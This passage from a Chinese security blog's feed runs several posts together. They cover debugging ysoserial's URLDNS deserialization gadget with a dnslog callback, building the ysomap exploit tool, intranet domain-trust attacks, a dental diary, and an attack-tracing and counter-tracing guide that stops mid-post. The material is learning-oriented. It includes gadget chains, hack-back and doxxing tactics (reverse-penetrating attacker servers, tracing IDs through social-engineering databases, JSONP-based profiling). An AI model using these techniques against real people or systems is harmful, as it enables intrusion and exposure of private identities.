class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再来调试下 ysoserial中的 URLDNS 模块，设置debug参数：</p><p><code>URLDNS &quot;http://7mczz6.dnslog.cn&quot;</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003414.png"></p><p>直接debug报错：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003427.png"></p><p>改一下Project 和 Moudles中的 <code>Project language level</code> ，其实就是所有都设置成一样的，包括pom.xml,实在不行，重新 <code>git pull</code> 重新导入idea 也能解决</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003532.png"></p><p>下断点进行单步调试，最后看这里</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210408003557.png"></p><p>方法之间的调用也很清楚的展示了出来。</p><p>借用一位师傅总结的 gadgets:</p><p>JDK1.8下的调用路线：</p><ol><li>HashMap-&gt;readObject()</li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>URLStreamHandler-&gt;hashCode()</li><li>URLStreamHandler-&gt;getHostAddress()</li><li>InetAddress-&gt;getByName()</li></ol><p>而在jdk1.7u80环境下调用路线会有一处不同，但是大同小异：</p><ol><li>HashMap-&gt;readObject()</li><li><strong>HashMap-&gt;putForCreate()</strong></li><li>HashMap-&gt;hash()</li><li>URL-&gt;hashCode()</li><li>之后相同</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>感谢：</p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541">https://wx.zsxq.com/dweb2/index/topic_detail/244415545824541</a></p><p><a href="https://www.t00ls.net/articles-50486.html">https://www.t00ls.net/articles-50486.html</a></p><p><a href="https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524">https://wx.zsxq.com/dweb2/index/topic_detail/548242484442524</a></p><p><a href="https://xz.aliyun.com/t/6787">https://xz.aliyun.com/t/6787</a></p><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512">https://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512</a></p><p><a href="https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/">https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</a></p><p><a href="https://paper.seebug.org/1242/#urldns">https://paper.seebug.org/1242/#urldns</a></p><p><a href="https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54">https://www.yuque.com/tianxiadamutou/zcfd4v/fewu54</a></p><p><a href="https://www.anquanke.com/post/id/201762">https://www.anquanke.com/post/id/201762</a></p><p><a href="https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f">https://medium.com/@m01e/ysoserial-urldns%E6%A8%A1%E5%9D%97%E5%88%86%E6%9E%90-33c80154f56f</a></p><p><a href="https://crossoverjie.top/2018/01/14/Synchronize/">https://crossoverjie.top/2018/01/14/Synchronize/</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;首发于阿里云先知社区，&lt;a href=&quot;https://xz.aliyun.com/t/9417&quot;&gt;https://xz.aliyun.com/t/9417&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="Java反序列化" scheme="https://hack-for.fun/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>脚本小子：安装Java利用工具时Maven 报错解决</title>
    <link href="https://hack-for.fun/b081.html"/>
    <id>https://hack-for.fun/b081.html</id>
    <published>2021-03-18T15:48:04.000Z</published>
    <updated>2021-03-18T15:56:58.050Z</updated>
    
    <content type="html"><![CDATA[<p>使用文档是这样的：</p><p>使用<code>mvn clean package -DskipTests</code>  ，我这里就报错了。</p><p>生成的jar位于<code>cli/target/ysomap-cli-0.0.1-SNAPSHOT-all.jar</code></p><p>执行<code>java -jar ysomap-0.0.1-SNAPSHOT-all.jar</code></p><p>解决如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210318235420.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210318235422.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210318235423.png"></p><p>解决办法：</p><p>用IDEA 自带的 maven install 就可以了。</p><p>具体报错原理的话：</p><p>可能是👇</p><p><a href="https://blog.csdn.net/u011734144/article/details/51894942">https://blog.csdn.net/u011734144/article/details/51894942</a></p><p>致谢：</p><p>感谢hpdoger师傅的解答。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;使用文档是这样的：&lt;/p&gt;
&lt;p&gt;使用&lt;code&gt;mvn clean package -DskipTests&lt;/code&gt;  ，我这里就报错了。&lt;/p&gt;
&lt;p&gt;生成的jar位于&lt;code&gt;cli/target/ysomap-cli-0.0.1-SNAPSHOT-all.ja</summary>
      
    
    
    
    
    <category term="JavaSec" scheme="https://hack-for.fun/tags/JavaSec/"/>
    
  </entry>
  
  <entry>
    <title>MacOS下设置Python爬虫代理池</title>
    <link href="https://hack-for.fun/a1df.html"/>
    <id>https://hack-for.fun/a1df.html</id>
    <published>2021-03-08T12:11:37.000Z</published>
    <updated>2021-03-10T16:13:12.767Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/jhao104/proxy_pool">https://github.com/jhao104/proxy_pool</a></p><p><a href="https://github.com/jhao104/proxy_pool/issues/473">https://github.com/jhao104/proxy_pool/issues/473</a></p><p><a href="https://proxy-pool.readthedocs.io/zh/latest/user/how_to_run.html">https://proxy-pool.readthedocs.io/zh/latest/user/how_to_run.html</a></p><p>如果已配置好运行环境, 具备运行条件, 可以通过 <code>proxyPool.py</code> 启动. <code>proxyPool.py</code> 是项目的CLI入口. 完整程序包含两部份: <code>schedule</code> 调度程序和 <code>server</code> API服务, 调度程序负责采集和验证代理, API服务提供代理服务HTTP接口.</p><p>通过命令行程序分别启动调度程序和API服务:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 启动调度程序</span><br><span class="line">$ python proxyPool.py schedule</span><br><span class="line"></span><br><span class="line"># 启动webApi服务</span><br><span class="line">$ python proxyPool.py server</span><br></pre></td></tr></table></figure><p>把redis 启动弄好，修改<code>HOST</code> 为 127.0.0.1</p><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210308230707733.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://github.com/jhao104/proxy_pool&quot;&gt;https://github.com/jhao104/proxy_pool&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/jhao104/prox</summary>
      
    
    
    
    
    <category term="Dev" scheme="https://hack-for.fun/tags/Dev/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透：跨域攻击分析及防范</title>
    <link href="https://hack-for.fun/593b.html"/>
    <id>https://hack-for.fun/593b.html</id>
    <published>2021-03-07T12:20:33.000Z</published>
    <updated>2021-03-10T16:13:12.770Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>内网中，一般通过域林进行资源共享。</p><p>逻辑隔离：根据不同的职能区分部门、划分主域和子域。</p><p>物理隔离：通过防火墙将各个子公司及各个部门划分为不同的区域。</p><p>为何必须要垮域来进行攻击？</p><blockquote><p>拿到了某个子域或者分公司的域控制器权限，但没有拿下整个公司内网的全部权限。或者是想要获得的资源不在当前拿下的这个域内。</p></blockquote><h1 id="常见的跨域攻击方法"><a href="#常见的跨域攻击方法" class="headerlink" title="常见的跨域攻击方法"></a>常见的跨域攻击方法</h1><ul><li>常规渗透方法（利用Web漏洞跨域拿Shell）</li><li>利用已知域散列值进行哈希传递、票据攻击（内网通用密码、密码存在一定规则、域控制器本地管理员密码可能相同）</li><li>利用域信任关系进行跨域攻击</li></ul><h2 id="利用域信任关系进行跨域攻击"><a href="#利用域信任关系进行跨域攻击" class="headerlink" title="利用域信任关系进行跨域攻击"></a>利用域信任关系进行跨域攻击</h2><p>域信任：解决多域环境中的跨域资源共享问题。域信任利用DNS服务器定位两个不同子域的域控制器，如果两个域中的域控制器都无法找到另一个域，就不存在通过域信任关系进行跨域资源共享。</p><h4 id="域信任关系介绍"><a href="#域信任关系介绍" class="headerlink" title="域信任关系介绍"></a>域信任关系介绍</h4><p><strong>域信任关系分为单向信任和双向信任</strong>。</p><p>信任流和访问流。</p><p><strong>域信任关系也可以分为内部信任和外部信任</strong>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;内网中，一般通过域林进行资源共享。&lt;/p&gt;
&lt;p&gt;逻辑隔离：根据不同的职能区分部门、划分主域和子域。&lt;/p&gt;
&lt;p</summary>
      
    
    
    
    
    <category term="红蓝对抗" scheme="https://hack-for.fun/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/"/>
    
  </entry>
  
  <entry>
    <title>生活记录：我的口腔健康折腾之路</title>
    <link href="https://hack-for.fun/516f.html"/>
    <id>https://hack-for.fun/516f.html</id>
    <published>2021-02-24T10:48:28.000Z</published>
    <updated>2021-03-10T16:12:58.220Z</updated>
    
    <content type="html"><![CDATA[<p>希望能成功</p><a id="more"></a><h1 id="造孽"><a href="#造孽" class="headerlink" title="造孽"></a>造孽</h1><p>因为以前小时候，爱吃甜食，然后晚上不刷牙，导致我的牙齿健康就非常差，补牙补了很多个了，然后六龄牙是坏到了已经不能补的程度，就一直那样拖着……直到只剩下残根。</p><blockquote><p>六龄牙，即6号牙，一辈子只长一次。在6岁的时候开始发育长出。</p></blockquote><p>其次，我的上排牙齿，有两、三颗左右长的比较“尖”，就是没按正常的方式来长。下排牙齿，因为六龄牙的问题，左右5号牙没有旁边6号牙的支撑，长期受力作用下，往4号牙靠，导致下排牙齿整体看上去比较“倾斜”。</p><h1 id="费用记录"><a href="#费用记录" class="headerlink" title="费用记录"></a>费用记录</h1><p>挂号：11 *3 = 33元</p><p>查血：96元</p><p>拍牙片：160元</p><p>消炎药和麻醉药：11.20元</p><p>拔牙：314元</p><p>开始矫正：</p><p>第一次费用：2256.35元（矫正费用是分几次给的、然后补了一颗牙），矫正最后算下来差不多8k～12k吧。</p><h1 id="折腾记录"><a href="#折腾记录" class="headerlink" title="折腾记录"></a>折腾记录</h1><h2 id="方案"><a href="#方案" class="headerlink" title="方案"></a>方案</h2><p>挂口腔科，医生会给你看牙齿情况，然后说大概方案。</p><p>A：有智齿，并且智齿情况良好。可以通过矫正的方式，将7号牙拖到6号牙，智齿替代7号牙。</p><p>B：无智齿，只能通过种植牙的方式来填补6号牙。</p><p>A、B方案，都需要矫正，矫正目的：长时间下6号牙缺失，导致上6号牙向下发育生长，需要通过矫正向上拉出空间，为种植牙提供空间。</p><p>所以，正好合适，矫正了牙齿也填补了6号牙的缺失。只是时间成本和金钱成本。</p><h2 id="查血（血常规、HIV、梅毒、乙肝）"><a href="#查血（血常规、HIV、梅毒、乙肝）" class="headerlink" title="查血（血常规、HIV、梅毒、乙肝）"></a>查血（血常规、HIV、梅毒、乙肝）</h2><p>  <img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195803.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195843.png"></p><h2 id="拍牙片"><a href="#拍牙片" class="headerlink" title="拍牙片"></a>拍牙片</h2><p>拔牙和矫正前需要拍全景片和侧位片：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195157.png" alt="全景片"></p><p>从全景片也可以看出，上排牙齿的不整齐、还有下面两个6号牙的残根，以及无智齿这么一个情况。</p><p>上面有15颗牙齿（右边似乎多了一个牙齿，估计矫正的时候又要拔牙。）、下面有14颗牙齿（两颗6号牙残根也算进去了）</p><p>白色部分都是补过牙的部分，这不必多解释。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195210.png" alt="侧位片"></p><p>从侧位图可以看到，牙齿咬合面是没有对齐的，然后颈椎那里感觉似乎有点问题，但是明天上午就去排MRI了，去骨科检查下颈椎。</p><h2 id="拔牙"><a href="#拔牙" class="headerlink" title="拔牙"></a>拔牙</h2><p>先去拿药：</p><ul><li>消炎药</li><li>麻醉药</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195226.png"></p><p>吃了药，然后就去拔牙。拔牙先打麻药，过程小疼，问题不大。</p><p>下面的图片可能有点血腥，晕血患者请远离战场。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195135.png" alt="拔牙的装备"></p><p>在流血和麻醉的作用下， 两个6号牙都拔了下来。不上图了。</p><p>然后就是需要注意：</p><ul><li>拔牙后第一天不能刷牙、动静很大的漱口</li><li>不能吃常规的食物，最好吃流体</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210224195109.png"></p><h2 id="拆线"><a href="#拆线" class="headerlink" title="拆线"></a>拆线</h2><p>一周后就去拆线了，在有线的情况下，漱口有时候会感觉到小小的痛，但是没啥大问题。</p><p>拆线的过程很轻松，一点也不痛。</p><p>先是上碘伏给部位消毒，漱口，然后就开始拆线了。</p><p>没有任何疼痛感。</p><h2 id="取模"><a href="#取模" class="headerlink" title="取模"></a>取模</h2><p>拔了呀，因为我还要矫正，所以紧接着就取模了。</p><p>取模就会用一个硅胶似的东西，包在嘴里，最后出来的经过一系列操作就是模型。</p><p>此外，还会放一个镜片在嘴里，拍照，上下各一次。</p><p>然后还会拍照（正面、侧面、左右45度拍照），正常表情和露齿笑。</p><p>医生说我的什么，具体忘了叫啥了，似乎有点斜，然后又用了一根长的直尺类似的木片，让我咬着，然后拍照。</p><p>取模的过程中，似乎我的脑袋有点习惯性后倾。。。看来体态问题还很多。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210307151202.JPG"></p><p>就放一张图片吧。。牙缝比较大，容易卡东西，要经常漱口。</p><p>牙医说一个星期后就可以去做矫正了，因为这段时间是给她想方案的。</p><h2 id="全口矫正（2021-3-9）"><a href="#全口矫正（2021-3-9）" class="headerlink" title="全口矫正（2021-3-9）"></a>全口矫正（2021-3-9）</h2><p>矫正之前，右上6号牙又出问题了，把之前补的牙齿给重新补了一下。</p><p>……</p><p>……</p><p>……</p><p>然后就是开始矫正：</p><p>粘矫正器附着用的沟槽，然后就是穿钢丝，然后就是弄钢丝，再然后就是调整一下，看有没有咬合的时候存在冲突的地方。</p><p>弄完之后反正很难受，吃饭都不方便，咬东西都时候还疼。</p><p>然后就是差不多 每一个月左右就要去复诊一次吧。</p><hr><p>下面用来记录一下变化过程吧 哈哈哈，还是比较期待的。</p><p>（可能会引起不适，谨慎观看。</p><p>佩戴矫正器的第一天：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311000820.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210311001025.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;希望能成功&lt;/p&gt;</summary>
    
    
    
    
    <category term="杂谈" scheme="https://hack-for.fun/tags/%E6%9D%82%E8%B0%88/"/>
    
  </entry>
  
  <entry>
    <title>如何防止溯源以及反溯源</title>
    <link href="https://hack-for.fun/49b7.html"/>
    <id>https://hack-for.fun/49b7.html</id>
    <published>2021-02-21T12:06:38.000Z</published>
    <updated>2021-04-03T03:02:08.360Z</updated>
    
    <content type="html"><![CDATA[<p>温故而知新。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20210222210541.png"></p><a id="more"></a><ul><li>资料均来自互联网以及个人整理，仅用作学习用途，禁止非法利用，详情《网络安全法》。</li><li>如有侵权，联系删除，感谢！</li></ul><h1 id="溯源"><a href="#溯源" class="headerlink" title="溯源"></a>溯源</h1><blockquote><p>网络攻击溯源技术通过综合利用各种手段主动地追踪网络攻击发起者、定位攻击源，结合网络取证和威胁情报，有针对性地减缓或反制网络攻击，争取在造成破坏之前消除隐患，在网络安全领域具有非常重要的现实意义。</p></blockquote><p>攻击溯源技术，国外又被称为“Threat Hunting”，是为了应对外部APT攻击者和内部利益驱动的员工威胁而提出的一种解决方案。威胁狩猎[4]技术不被动地等待与响应，而是通过持续性监测技术，更早、更快地检测和发现威胁，并追踪威胁的源头。威胁狩猎技术强调用攻击者的视角来检测攻击，减少攻击者驻留时间，从而显著地改善组织的安全状况。放眼世界，包括FireEye等为代表的厂商以及越来越多的大型组织也开始进行威胁狩猎。</p><p>工具</p><p>安全分析师需要检查系统和网络上发生的历史操作记录和当前状态详细信息，因此需要依靠多种工具和数据源来协助溯源分析，常用的工具包括：</p><ol><li><p>安全监控工具：安全分析师使用不同来源的监控数据，例如防火墙、终端防护、网络入侵检测、内部威胁检测以及其他安全工具的监控数据，用以描绘驻留在网络中的攻击者所进行的活动。</p></li><li><p>可视化分析工具：帮助安全分析师通过使用交互式仪表板来实现复杂关系数据可视化，发现不同数据集之间的隐藏关联关系。</p></li><li><p>SIEM解决方案：SIEM解决方案从网络环境中的各种来源收集结构化日志数据，提供对数据的实时分析并向相关部门发出安全警报。SIEM解决方案可帮助安全分析师自动收集并利用来自安全监视工具和其他来源的大量日志数据，从而识别潜在安全威胁。</p></li><li><p>网络威胁情报：威胁情报提高了分析人员识别相关威胁并及时做出响应的能力，通过开源的威胁情报库实现信息交换，得到威胁分析所需的恶意IP地址、恶意软件哈希值等信息。</p></li><li><p>其他工具：一些特定功能的分析工具对攻击溯源也有很好的帮助，例如检查PDF操作、PowerShell操作等。</p></li></ol><hr><p>上面的说的太官方了，贴一个比较通俗易懂的。</p><p>被攻击后溯源：</p><blockquote><p>出现异常的时间点(非常重要)、异常服务器的主要业务情况、大致的一个网络拓扑是不是在DMZ区、是否可以公网访问、开放了那些端口、是否有打补丁、使用了怎么样的一个web技术、最近是否做过什么变更、有没有什么安全设备之类的。</p></blockquote><p>根据收集到的信息，往往可以得出了几种可能。一个web服务器公网可以访问出现了被挂黑链的事件使用了s2框架，那么初步可以怀疑是s2-045 s2-046之类的命令执行漏洞了；如果一台公网服务器没有安装补丁又没有防火墙防护，administrator的密码为P@sswrod那么有很大的可能性是被暴力破解成功；后面的工作主要就是收集各种资料证明这一猜想即可。</p><h2 id="攻击源捕获"><a href="#攻击源捕获" class="headerlink" title="攻击源捕获"></a>攻击源捕获</h2><p>安全设备报警，如扫描IP、威胁阻断、病毒木马、入侵事件等<br> 日志与流量分析，异常的通讯流量、攻击源与攻击目标等<br> 服务器资源异常，异常的文件、账号、进程、端口，启动项、计划任务和服务等<br> 邮件钓鱼，获取恶意文件样本、钓鱼网站URL等<br> 蜜罐系统，获取攻击者行为、意图的相关信</p><h3 id="基于日志的溯源（Web-系统被攻击）"><a href="#基于日志的溯源（Web-系统被攻击）" class="headerlink" title="基于日志的溯源（Web 系统被攻击）"></a>基于日志的溯源（Web 系统被攻击）</h3><p>使用路由器、主机等设备记录网络传输的数据流中的关键信息(时间、源地址、目的地址)，追踪时基于日志查询做反向追踪。</p><p>这种方式的优点在于兼容性强、支持事后追溯、网络开销较小。但是同时该方法也受性能、空间和隐私保护等的限制，考虑到以上的因素，可以限制记录的数据特征和数据数量。另外可以使用流量镜像等技术来减小对网络性能的影响。</p><p>常见几个中间件的日志如下：</p><blockquote><p>1.apache的日志路径一般配置在httpd.conf的目录下或者位于/var/log/http</p><p>2.IIS的日志默认在系统目录下的Logfiles下的目录当中</p><p>3.tomcat 一般位于tomcat安装目录下的一个logs文件夹下面</p><p>4.Nginx日志一般配置在nginx.conf或者vhost的conf文件中</p><p>日志一般以日期命名，方便后续审计与安全人员进行分析。</p></blockquote><h3 id="主机系统、数据库系统"><a href="#主机系统、数据库系统" class="headerlink" title="主机系统、数据库系统"></a>主机系统、数据库系统</h3><p>Linux:</p><p>/var/log/auth.log 包含系统授权信息，包括用户登录和使用的权限机制等信息</p><p>/var/log/lastlog 记录登录的用户，可以使用命令lastlog查看</p><p>/var/log/secure 记录大多数应用输入的账号与密码，登录成功与否</p><p>/var/log/cron 记录crontab命令是否被正确的执行</p><p>Windows：</p><p>Windows平台下面的溯源就相对容易一些当然主要还是依靠windows的日志一般用 eventvwr命令打开事件查看器。默认分为三类：l应用程序、安全、性统 以evt文件形式存储%systemroot%\system32\config目录：</p><p><img src="https://image.3001.net/images/20190426/1556290560_5cc31c00740d8.png!small"></p><p>合理使用筛选器往往可以帮助我们更好的排查日志，比如怀疑是暴力破解入侵的筛选<strong>事件ID == 4625审核失败的日志，后续通过对时间的排查、以及源IP地址、类型与请求的频率进行分析来判断是否是来源于内网的暴力破解。</strong></p><p><img src="https://image.3001.net/images/20190426/1556290578_5cc31c126b0eb.png!small"></p><p>通过系统内部的日志来判断是否是恶意进程的运行状态。</p><p><img src="https://image.3001.net/images/20190426/1556290597_5cc31c251d176.png!small"></p><p>如下图是一个典型的SMB认证失败的情况：</p><p><img src="https://image.3001.net/images/20190426/1556290673_5cc31c715e3fb.png!small"></p><p>然后就是Windows 补丁了。</p><h3 id="路由输入调试技术"><a href="#路由输入调试技术" class="headerlink" title="路由输入调试技术"></a>路由输入调试技术</h3><p>在攻击持续发送数据，且特性较为稳定的场景下，可以使用路由器的输入调试技术，在匹配到攻击流量时动态的向上追踪。这种方式在DDoS攻击追溯中比较有效，且网络开销较小。</p><h2 id="分析模型——杀伤链模型-amp-钻石模型"><a href="#分析模型——杀伤链模型-amp-钻石模型" class="headerlink" title="分析模型——杀伤链模型&amp;钻石模型"></a>分析模型——杀伤链模型&amp;钻石模型</h2><p>杀伤链这个概念源自军事领域，它是一个描述攻击环节的模型。一般杀伤链有认为侦查跟踪(Reconnaissance)、武器构建(Weaponization)、载荷投递(Delivery)、漏洞利用(Exploitation)、安装植入(Installation)、通信控制(Command&amp;Control)、达成目标(Actions on Objective)等几个阶段。</p><p>钻石模型由网络情报分析与威胁研究中心(The Center for Cyber Intelligence Anaysis and Threat Research，CCIATR)机构的Sergio Catagirone等人在2013年提出。</p><p>该模型把所有的安全事件(Event)分为四个核心元素，即敌手(Adversary)，能力(Capability)，基础设施(Infrastructure)和受害者(Victim)，以菱形连线代表它们之间的关系，因而命名为“钻石模型”。</p><p>杀伤链模型的特点是可说明攻击线路和攻击的进程，而钻石模型的特点是可说明攻击者在单个事件中的攻击目的和所使用攻击手法。</p><h2 id="关联分析方法"><a href="#关联分析方法" class="headerlink" title="关联分析方法"></a>关联分析方法</h2><p>关联分析用于把多个不同的攻击样本结合起来。</p><p>文档类（比如钓鱼，附件等。</p><ul><li>hash</li><li>ssdeep</li><li>版本信息(公司/作者/最后修改作者/创建时间/最后修改时间)</li></ul><p>行为分析</p><p>基于网络行为，类似的交互方式</p><p>可执行文件相似性分析</p><ul><li>特殊端口</li><li>特殊字符串/密钥</li><li>PDB文件路径<ul><li>相似的文件夹</li></ul></li><li>代码复用<ul><li>相似的代码片段</li></ul></li></ul><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="bypass-师傅博客"><a href="#bypass-师傅博客" class="headerlink" title="bypass 师傅博客"></a>bypass 师傅博客</h3><p>案例一：邮件钓鱼攻击溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：攻击者利用社会工程学技巧伪造正常邮件内容，绕过邮件网关的查杀，成功投递到目标邮箱，诱骗用户点击邮件链接或下载附件文件。</span><br><span class="line">信息收集： 通过查看邮件原文，获取发送方IP地址、域名后缀邮箱、钓鱼网站或恶意附件样本等信息。</span><br><span class="line">溯源方式：第一种，可以通过相关联的域名&#x2F;IP进行追踪；第二种，对钓鱼网站进行反向渗透获取权限，进一步收集攻击者信息；第三种，通过对邮件恶意附件进行分析，利用威胁情报数据平台寻找同源样本获取信息，也能进一步对攻击者的画像进行勾勒。</span><br></pre></td></tr></table></figure><p>案例二：Web入侵溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：攻击者通过NDAY和0DAY漏洞渗入服务器网段，Webshell 触发安全预警或者威胁检测阻断了C&amp;C域名的通讯。</span><br><span class="line">溯源方式：隔离webshell样本，使用Web日志还原攻击路径，找到安全漏洞位置进行漏洞修复，从日志可以找到攻击者的IP地址，但攻击者一般都会使用代理服务器或匿名网络（例如Tor）来掩盖其真实的IP地址。</span><br><span class="line">在入侵过程中，使用反弹shell、远程下载恶意文件、端口远程转发等方式，也容易触发威胁阻断，而这个域名&#x2F;IP，提供一个反向信息收集和渗透测试的路径。</span><br></pre></td></tr></table></figure><p>案例三：蜜罐溯源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻防场景：在企业内网部署蜜罐去模拟各种常见的应用服务，诱导攻击者攻击。</span><br><span class="line">溯源方式：在攻击者入侵蜜罐时，蜜罐可以记录攻击者的入侵行为，获取攻击者的主机信息、浏览器信息、甚至是真实 IP及社交信息。</span><br></pre></td></tr></table></figure><h3 id="阿里云安全中心的案例"><a href="#阿里云安全中心的案例" class="headerlink" title="阿里云安全中心的案例"></a>阿里云安全中心的案例</h3><p>（其实是一个产品，不过这个图片思路值得学习）</p><ul><li>蠕虫传播事件</li></ul><p>下图描述了蠕虫传播源（例如：<code>185.234.*.*</code>）通过SSH暴力破解成功登录到服务器，并通过bash执行<strong>curl</strong>指令从远端下载挖矿程序并在服务器中执行该挖矿程序。</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45771.png"></p><ul><li>Web漏洞入侵事件</li></ul><p>下图描述了黑客通过服务器（例如：<code>202.144.*.*</code>）发起攻击，通过Web漏洞向Linux服务器植入恶意shell脚本和挖矿程序，同时将代码写入计划任务（<strong>crond</strong>）实现攻击持久化。您可以通过溯源页面的节点信息，清晰地了解这一过程。此外，还可以观察到攻击者的多个IP及恶意下载源URL信息。</p><p><img src="https://static-aliyun-doc.oss-accelerate.aliyuncs.com/assets/img/zh-CN/0713029951/p45773.png"></p><h3 id="由WebShell-溯源攻击者的入侵途径"><a href="#由WebShell-溯源攻击者的入侵途径" class="headerlink" title="由WebShell 溯源攻击者的入侵途径"></a>由WebShell 溯源攻击者的入侵途径</h3><p><a href="https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/">https://www.sec-un.org/by-webshell-intrusion-way-to-trace-the-attacker/</a></p><h1 id="反溯源（溯源反制）"><a href="#反溯源（溯源反制）" class="headerlink" title="反溯源（溯源反制）"></a>反溯源（溯源反制）</h1><h2 id="ip-定位技术"><a href="#ip-定位技术" class="headerlink" title="ip 定位技术"></a>ip 定位技术</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">根据IP定位物理地址—代理IP</span><br><span class="line"> 溯源案例：通过IP端口扫描，反向渗透服务器进行分析，最终定位到攻击者相关信息</span><br></pre></td></tr></table></figure><h2 id="id-追踪"><a href="#id-追踪" class="headerlink" title="id 追踪"></a>id 追踪</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ID追踪术，搜索引擎、社交平台、技术论坛、社工库匹配</span><br><span class="line">溯源案例：利用ID从技术论坛追溯邮箱，继续通过邮箱反追踪真实姓名，通过姓名找到相关简历信息</span><br></pre></td></tr></table></figure><h2 id="网站url"><a href="#网站url" class="headerlink" title="网站url"></a>网站url</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">域名Whois查询—注册人姓名、地址、电话和邮箱。—域名隐私保护</span><br><span class="line"> 溯源案例：通过攻击IP历史解析记录&#x2F;域名，对域名注册信息进行溯源分析</span><br></pre></td></tr></table></figure><p>但是一般技术人员应该都是静态博客吧，hexo 这些。</p><h2 id="恶意样本"><a href="#恶意样本" class="headerlink" title="恶意样本"></a>恶意样本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">提取样本特征、用户名、ID、邮箱、C2服务器等信息—同源分析</span><br><span class="line">溯源案例：样本分析过程中，发现攻击者的个人ID和QQ，成功定位到攻击者。</span><br></pre></td></tr></table></figure><h2 id="社交账号"><a href="#社交账号" class="headerlink" title="社交账号"></a>社交账号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">基于JSONP跨域，获取攻击者的主机信息、浏览器信息、真实 